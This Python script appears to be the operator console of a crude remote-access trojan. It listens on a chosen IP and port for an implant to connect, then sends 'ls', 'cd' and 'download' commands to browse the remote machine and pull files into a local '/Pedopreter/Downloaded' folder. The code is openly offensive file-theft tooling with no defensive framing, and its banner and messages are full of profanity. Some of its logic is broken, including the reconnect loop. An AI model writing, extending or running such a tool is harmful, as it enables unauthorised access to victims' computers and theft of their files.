#!/usr/bin/env python

import socket
import os
import pickle
import time
import pip
import _winapi
import ctypes

print("What the fuck you want")
print("1. Listen")
print("2. Create payload")


q = input()
if q == "1":
    os.system("clear")
    os.system("cls")
    print("ok what ip")
    TCP_IP = input()
    os.system("cls")
    os.system("clear")
    print("ok thanks. what port")
    TCP_PORT = int(input())
    print("fuck you anyway")
    time.sleep(1)
    os.system("clear")
    os.system("cls")
elif q == "2":
    print("ok so create a payload huh? i dont care so im not doing it")

# Initialization and stuff
try:
    os.mkdir("/Pedopreter")
except:
    print("already exists")
try:
    os.mkdir("/Pedopreter/Downloaded")
except:
    print("already exists")


BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)
sold = s
s, addr = s.accept()
print('Connection address:', addr)

while True:
    try:
        s.settimeout(60)
        thing = input()
        thing2 = thing.split()
        if thing2[0]:
            if thing2[0] == "help":
                print("Following commands:")
                print("cd [path]")
                print("ls [path]")
                print("download [full path of wanted download] [output file name INCLUDING EXTRENSION like .txt]")
            elif thing2[0] == "ls":
                s.send(" ".join(thing2).encode())
                dataraw = s.recv(BUFFER_SIZE).decode()
                data = dataraw.split()
                for x in data:
                    print(x)
            elif thing2[0] == "cd":
                if len(thing2) == 2:
                    s.send(" ".join(thing2).encode())
                    s.settimeout(10)
                    try:
                        q = s.recv(BUFFER_SIZE).decode()
                        print(q)
                    except:
                        print("timed out")
            elif thing2[0] == "download":
                if len(thing2) == 3:
                    s.send(" ".join(thing2).encode())
                    f = open("/Pedopreter/Downloaded/"+thing2[2], "wb")
                    l = s.recv(4096)
                    f.write(l)
                    while (l):
                        print("receiving...")
                        try:
                            l = s.recv(4096)
                            f.write(l)
                        except:
                            print("Something went wrong during the download. Maybe it doesnt exist anymore or the connection was closed. fuck you man you cant even download a file properly")
                    
                    print("Done")
    except Exception as e:
        print("whoops something went wrong.. reconnecting..")
        print("this was the error:")
        print(e)
        sold.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((TCP_IP, TCP_PORT))
        s.listen(1)
        s, addr = sold.accept()




